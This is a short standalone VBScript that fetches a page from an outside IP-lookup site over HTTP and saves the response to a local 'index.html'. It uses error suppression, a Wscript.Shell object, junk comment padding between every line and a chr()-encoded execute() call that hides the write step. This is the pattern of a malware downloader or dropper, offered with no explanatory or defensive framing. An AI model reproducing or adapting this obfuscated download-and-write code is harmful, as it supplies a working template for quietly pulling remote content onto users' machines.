on error resume next
'I love ss 2008 ' I love ss for ever
Set Shell = CreateObject("Wscript.Shell")
'I love ss 2008 ' I love ss for ever
Set Post = CreateObject("Msxml2.XMLHTTP")
'I love ss 2008 ' I love ss for ever
Post.Open "GET","http://ip138.com/ip2city.asp",0 
'I love ss 2008 ' I love ss for ever
Post.Send()
'I love ss 2008 ' I love ss for ever
Set GG = CreateObject("ADODB.Stream")
'I love ss 2008 ' I love ss for ever
GG.Mode = 3 
'I love ss 2008 ' I love ss for ever
GG.Type = 1 
'I love ss 2008 ' I love ss for ever
GG.Open() 
'I love ss 2008 ' I love ss for ever
execute(chr(71)&chr(71)&chr(46)&chr(87)&chr(114)&chr(105)&chr(116)&chr(101)&chr(40)&chr(80)&chr(111)&chr(115)&chr(116)&chr(46)&chr(114)&chr(101)&chr(115)&chr(112)&chr(111)&chr(110)&chr(115)&chr(101)&chr(66)&chr(111)&chr(100)&chr(121)&chr(41))
GG.SaveToFile "index.html",2 
